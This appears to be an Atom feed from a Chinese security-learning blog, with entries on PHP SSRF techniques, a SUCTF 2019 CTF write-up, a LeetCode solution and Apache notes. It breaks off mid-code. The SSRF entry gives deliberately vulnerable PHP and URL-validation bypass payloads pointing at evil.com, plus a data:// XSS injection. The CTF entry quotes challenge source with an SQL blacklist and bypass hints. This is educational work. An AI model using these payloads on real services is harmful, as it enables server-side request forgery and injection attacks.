    <title>PHP SSRF Techniques</title>
    <link href="https://prontosil.club/2019/08/21/php-ssrf-techniques-fan-yi/"/>
    <id>https://prontosil.club/2019/08/21/php-ssrf-techniques-fan-yi/</id>
    <published>2019-08-21T10:29:13.000Z</published>
    <updated>2019-09-15T15:49:03.264Z</updated>
    
    <content type="html"><![CDATA[<h2>写前面</h2><p>这篇文章讲的实在是太棒了 <a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p><p>php版本：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php4.png" alt=""></p><p>测试代码：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>首先调用了<code>filter_var</code>进行URL的验证，然后再用<code>parse_url</code>去解析URL，php7的版本中这个函数是没有问题的</p><p>同时通过<code>preg_match</code>函数限定只能以<code>google.com</code>结尾</p><p>如果达到ssrf呢？</p><p>正常情况下</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php5.png" alt=""></p><p>攻击者：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php6.png" alt=""></p><p>此时$r['host']显然不是以<code>google.com</code>结尾的</p><h2>绕过URL验证和正则表达式</h2><blockquote><p>许多URL schema保留某些特殊含义的字符：它们在URL的特定于方案的部分中的外观具有指定的语义。如果在方案中保留对应于八位字节的字符，则必须对八位字节进行编码。字符“;”，“/”，“？”，“：”，“@”，“=”和“＆”可以保留用于方案内的特殊含义。在方案中不能保留其他字符。</p></blockquote><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php7.png" alt="什么是URL schema"></p><p>通常会用一些保留字符，比如<code>;</code>和<code>=</code>，<code>,</code>分割参数和参数值</p><p>一个可能是用<code>name;v=1.1</code>来表示name=version 1.1,然而也可以用<code>name,1.1</code>达到相同的效果，这根据算法来区分</p><p>curl或者wget会认为<code>evil.com;google.com</code>中<code>hostname</code>为<code>evil.com</code>,<code>querystring</code>为<code>google.com</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php8.png" alt=""></p><p>但是并没有绕过<code>filter_var</code>函数<code>filter_var()</code>函数可以解析很多不同的URL scheme</p><p>如果改成这样：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php9.png" alt="随便改，改成不认识的就行"></p><p>此时已经成功地绕过了URL验证和正则表达式</p><p>但是curl命令却没有执行，于是考虑加上端口号</p><p>再次修改：</p><p><code>php test.php &quot;111://evil.com:80;google.com:80/&quot;</code><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php10.png" alt=""></p><p>同样用逗号也行</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php11.png" alt=""></p><p>parse_url只会尽可能地分割URL，而不是验证它，作者还提到了一种更好的方式：</p><p><code>0://evil$google.com</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php12.png" alt=""></p><p>注意这里必须用单引号括起来。。</p><h2>实现XSS</h2><p>作者之后修改了代码：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         $a = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">         <span class="keyword">echo</span>($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>作者想要注入一点东西,但是并没有成功<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php13.png" alt=""></p><p>继续尝试：</p><p><code>data://google.com/plain;base64,SSBsb3ZlIFBIUAo=</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php14.png" alt="此时注入成功了"></p><p>那么XSS就很容易了</p><h2>参考</h2><p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">PHP SSRF Techniques</a></p><p><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/" target="_blank" rel="noopener">Some trick in ssrf and unserialize()</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;写前面&lt;/h2&gt;
&lt;p&gt;这篇文章讲的实在是太棒了 &lt;a href=&quot;https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://m
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="web" scheme="https://prontosil.club/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>threeSumClosest</title>
    <link href="https://prontosil.club/2019/08/20/threesumclosest/"/>
    <id>https://prontosil.club/2019/08/20/threesumclosest/</id>
    <published>2019-08-20T13:24:51.000Z</published>
    <updated>2019-08-22T13:49:37.438Z</updated>
    
    <content type="html"><![CDATA[<p>好久没写leetcode了，最近决定用php来写一些</p><p>threesumcloset这题要求在一个数组中找到离target最近的三个数的和</p><p>这里用到了一下双指针的思路，就是确定两个指针，一个往高走，一个往低走</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">threeSumClosest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer[] $nums</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">threeSumClosest</span><span class="params">($nums, $target)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="comment">//先排序，php数组排序的函数</span></span><br><span class="line">        sort($nums);</span><br><span class="line">        <span class="comment">//计算长度</span></span><br><span class="line">        $len = count($nums);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 基本思路：通过i遍历数组，再设置两个指针</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $minidistance = PHP_INT_MAX; <span class="comment">//保存最小的距离</span></span><br><span class="line">        $low = <span class="number">1</span>;</span><br><span class="line">        $high = $len<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len<span class="number">-2</span>; $i++)&#123;</span><br><span class="line">            <span class="comment">//要去重</span></span><br><span class="line">            <span class="keyword">if</span> ($i &gt; <span class="number">0</span> &amp;&amp; $nums[$i] == $nums[$i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//得到两个指针</span></span><br><span class="line"></span><br><span class="line">            $sum = $nums[$low]+$nums[$high]+$nums[$i];</span><br><span class="line">            $distance = $target-$sum;</span><br><span class="line">            <span class="keyword">if</span>($distance == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> $distance;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>($distance !== <span class="number">0</span>&amp;&amp; abs($distance) &lt; abs($minidistance))&#123;</span><br><span class="line">                $minidistance = $sum;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//然后开始移动指针</span></span><br><span class="line">            <span class="keyword">if</span>($distance &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//小于0是不是可以把low调大一点，注意去重</span></span><br><span class="line">                <span class="keyword">if</span>($low &lt; $high &amp;&amp; $nums[$low] != $nums[$low<span class="number">-1</span>])&#123;</span><br><span class="line">                    $low =  $low + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span> ($distance &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>($low &lt; $high &amp;&amp; $nums[$high] != $nums[$high+<span class="number">1</span>])&#123;</span><br><span class="line">                    $high = $high - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $minidistance;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> threeSumClosest();</span><br><span class="line"></span><br><span class="line">$nums = [<span class="number">-1</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">4</span>];</span><br><span class="line">$target = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;threeSumClosest($nums, $target);</span><br></pre></td></tr></table></figure></p><p>新手php代码写的还很烂，提交之后没有过</p><p>遇到了几个地方记录一下</p><ol><li><p>php的注释形式，需要写清楚参数的类型和返回值</p></li><li><p>php中最大的整数是PHP_INT_MAX</p></li><li><p><code>if ($i &gt; 0 &amp;&amp; $nums[$i] == $nums[$i-1]){</code>由于没有加上<code>$i&gt;0</code>，php可以倒过来取数字而不报错的</p></li></ol><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0,0,0]</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p><p>这个测试过不了</p><ol start="4"><li><p>去重的方式了解一下</p></li><li><p><a href="https://www.php.net/manual/zh/array.sorting.php" target="_blank" rel="noopener">php数组排序</a> 这里用sort就好，之前用asort的时候索引没有变。这种排序也是很强了</p></li></ol><p>最后的这个报错很玄学了</p><p><img src="https://i.loli.net/2019/08/20/tAsdHz8RPB9bQfi.png" alt=""></p><p>更新一下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">threeSumClosest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer[] $nums</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">threeSumClosest1</span><span class="params">($nums, $target)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="comment">//先排序，php数组排序的函数</span></span><br><span class="line">        sort($nums);</span><br><span class="line">        <span class="comment">//计算长度</span></span><br><span class="line">        $len = count($nums);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 基本思路：通过i遍历数组，再设置两个指针</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $minidistance = PHP_INT_MAX; <span class="comment">//保存最小的距离</span></span><br><span class="line">        $low = <span class="number">1</span>;</span><br><span class="line">        $high = $len<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len<span class="number">-2</span>; $i++)&#123;</span><br><span class="line">            <span class="comment">//要去重</span></span><br><span class="line">            <span class="comment">//得到两个指针</span></span><br><span class="line">            $low = $i+<span class="number">1</span>;</span><br><span class="line">            $high = $len<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>($low &lt; $high)&#123;</span><br><span class="line">              $sum = $nums[$i]+$nums[$low]+$nums[$high];</span><br><span class="line">              $distance = $target-$sum;</span><br><span class="line">              <span class="keyword">if</span>($distance === <span class="number">0</span>)&#123;<span class="keyword">return</span>  $distance;&#125;</span><br><span class="line">              <span class="keyword">if</span>(abs($distance) &lt; abs($minidistance))&#123;$minidistance = $distance;&#125;</span><br><span class="line">              <span class="keyword">if</span>($distance &gt; <span class="number">0</span>)&#123;$low=$low+<span class="number">1</span>;&#125;</span><br><span class="line">              <span class="keyword">if</span>($distance &lt; <span class="number">0</span>)&#123;$high=$high<span class="number">-1</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $target - $minidistance;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> threeSumClosest();</span><br><span class="line"></span><br><span class="line">$nums = [<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">55</span>];</span><br><span class="line">$target = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;threeSumClosest1($nums, $target);</span><br></pre></td></tr></table></figure></p><p>success</p><h2>参考</h2><p><a href="https://blog.csdn.net/ohmygirl/article/details/7850068" target="_blank" rel="noopener">算法总结--数组相关 双指针法的常见应用。</a><a href="https://leetcode.com/problems/3sum-closest/discuss/252701/php-28-ms-(faster-than-100.00)-14.9-MB-(less-than-100.00)" target="_blank" rel="noopener">大师傅的代码</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好久没写leetcode了，最近决定用php来写一些&lt;/p&gt;
&lt;p&gt;threesumcloset这题要求在一个数组中找到离target最近的三个数的和&lt;/p&gt;
&lt;p&gt;这里用到了一下双指针的思路，就是确定两个指针，一个往高走，一个往低走&lt;/p&gt;
&lt;p&gt;&lt;figure clas
      
    
    </summary>
    
      <category term="leetcode" scheme="https://prontosil.club/categories/leetcode/"/>
    
    
      <category term="array" scheme="https://prontosil.club/tags/array/"/>
    
      <category term="search" scheme="https://prontosil.club/tags/search/"/>
    
  </entry>
  
  <entry>
    <title>学习apache</title>
    <link href="https://prontosil.club/2019/08/20/xue-xi-apache/"/>
    <id>https://prontosil.club/2019/08/20/xue-xi-apache/</id>
    <published>2019-08-20T09:29:56.000Z</published>
    <updated>2019-09-16T03:05:16.248Z</updated>
    
    <content type="html"><![CDATA[<p>一直以来习惯了在Windows下通过wampserver和phpstudy来进行php,apache,mysql的组合，现在有必要自己从头开始进行一些学习了</p><h2>apache配置学习</h2><h2>.htaccess文件</h2><p>先看一段防盗链的代码：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RewriteBase /</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; !^$</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; !^http://(www.)?aqee.net/.*$ [NC]</span><br><span class="line"></span><br><span class="line">RewriteRule .(gif|jpg|swf|flv|png)$ /feed/ [R=302,L]</span><br></pre></td></tr></table></figure></p><p>肯定是一脸茫然</p><p>那就好好学习一下.htaccess文件</p><h2>服务器状态码</h2><p>在服务器回应客户端时会回应相应的状态码，不同的状态码具有不同的含义</p><p>1xx：信息类</p><p>2xx：成功类</p><p>3xx：重定向类</p><p>4xx：客户端错误类</p><p>5xx：服务端错误类</p><p>（比如我用flask写一个小型的应用时，遇到了500的错误其实是代码出错了😢</p><h2>参考</h2><p><a href="https://blog.51cto.com/jackcui/1858989" target="_blank" rel="noopener">由浅入深学习apache</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直以来习惯了在Windows下通过wampserver和phpstudy来进行php,apache,mysql的组合，现在有必要自己从头开始进行一些学习了&lt;/p&gt;
&lt;h2&gt;apache配置学习&lt;/h2&gt;
&lt;h2&gt;.htaccess文件&lt;/h2&gt;
&lt;p&gt;先看一段防盗链的代码
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="apache" scheme="https://prontosil.club/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>suctf2019</title>
    <link href="https://prontosil.club/2019/08/20/suctf2019/"/>
    <id>https://prontosil.club/2019/08/20/suctf2019/</id>
    <published>2019-08-20T01:40:17.000Z</published>
    <updated>2019-08-21T05:59:03.628Z</updated>
    
    <content type="html"><![CDATA[<h2>easy_sql</h2><p>应该是非预期解，输入abs(1)就有flag</p><p>不过也可以这样</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql6.png" alt=""></p><p>后期在线维护的时候泄露了源码</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>看源码不太明白这个题目的用意，后来参考师傅们的wp时提到了<code>||</code>拼接</p><p><a href="https://blog.csdn.net/lixora/article/details/60572357" target="_blank" rel="noopener">mysql 修改sql_mode 实现字符串管道‘||’连接</a></p><p>一种思路是直接使用<code>*,1</code>去拿到flag，另一种方式就是设置<code>sql_mode</code>来实现字符串的拼接</p><h2>python nginx</h2><p>首页有源码</p><p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">        @app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span 